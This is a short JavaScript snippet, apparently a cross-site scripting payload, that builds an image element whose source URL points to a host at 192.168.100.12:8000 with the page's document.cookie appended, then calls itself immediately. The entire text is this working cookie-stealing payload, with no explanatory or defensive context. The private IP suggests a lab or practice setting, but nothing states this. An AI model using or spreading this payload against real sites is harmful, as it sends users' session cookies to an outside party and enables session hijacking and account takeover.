function addTheImage() { 
 var img = document.createElement('img'); 
 img.src = 'http://192.168.100.12:8000/' + document.cookie; 
document.body.appendChild(img); 
} 
addTheImage(); 
